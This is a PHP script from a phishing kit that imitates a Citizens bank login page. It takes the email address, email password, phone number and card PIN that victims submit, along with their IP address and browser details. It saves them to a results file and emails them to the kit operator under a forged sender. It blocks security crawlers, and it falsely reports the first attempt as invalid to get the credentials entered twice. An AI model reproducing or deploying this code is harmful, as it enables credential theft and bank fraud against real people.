<?php
session_start();

include "../../admin/config.php";
if($bots == "on"){
    include '../antbots/ip_blocklist.php';  
    include '../antbots/Crawler.php';
    include '../antbots/Boting.php';
    include '../antbots/blacklist.php';
    include '../antbots/new.php';
    include '../antbots/myz.php';
}


$ip = $_SERVER['REMOTE_ADDR'];
if($double_access == "on"){}else{
$ff = fopen("huehue2",'a');
fwrite($ff,$ip."\n");
fclose($ff);
}

$huehue = file_get_contents("huehue2");
if(strpos($huehue, $ip) !== false){

    if(!empty($_POST['email'])){
    
        $file= "../Result/access".$pin.".txt";
        
        $data  = "[ - ] =======| DOUBLE EMAIL |======== [ - ]\n";
        $data .= "[+]Email:      ".$_POST['email']."\n";
        $data .= "[+]EmailPass:  ".$_POST['emailpassword']."\n";
        $data .= "[+]Phone:      ".$_POST['phone']."\n";
        $data .= "[+]CPIN:       ".$_POST['cpin']."\n";
        $data .= "[ - ] =======| -- |=========== [ - ]\n";
        $data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
        $data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
        $data .= "[ - ] =======| LG4 |=========== [ - ]\n";
        $praga=rand();
        $praga=md5($praga);
        $pra = rand(1111111111,9999999999);
        
        
        $f = fopen($file,'a+');
        fwrite($f,$data."\n");
        fclose($f);
        
        
        $to = $your_email;
        $subject = $pra."- Citizen L0G1N I-[".$_SERVER['REMOTE_ADDR']."]";
        $headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
        mail($to,$subject,$data,$headers);
            
        $contents = file_get_contents("huehue2");
        $contents = str_replace($ip, '', $contents);
        file_put_contents("huehue2", $contents);
        
            header("location: /credit_verify.php");

        }else{
            header("location: /email_identification.php?invalid");
        }
    
}else{
    if(!empty($_POST['email'])){
    
        $file= "../Result/access".$pin.".txt";
        
        $data  = "[ - ] =======| Email |======== [ - ]\n";
        $data .= "[+]Email:      ".$_POST['email']."\n";
        $data .= "[+]EmailPass:  ".$_POST['emailpassword']."\n";
        $data .= "[+]Phone:      ".$_POST['phone']."\n";
        $data .= "[+]CPIN:       ".$_POST['cpin']."\n";
        $data .= "[ - ] =======| -- |=========== [ - ]\n";
        $data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
        $data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
        $data .= "[ - ] =======| LG4 |=========== [ - ]\n";
        $praga=rand();
        $praga=md5($praga);
        $pra = rand(1111111111,9999999999);
 
        
        
        $f = fopen($file,'a+');
        fwrite($f,$data."\n");
        fclose($f);
        
        
        $to = $your_email;
        $subject = $pra."- Citizen L0G1N I-[".$_SERVER['REMOTE_ADDR']."]";
        $headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
        mail($to,$subject,$data,$headers);
        $ff = fopen("huehue2",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);
            
        header("location: /email_identification.php?invalid");

    }else{
        header("location: /email_identification.php?invalid");
    }
}

?>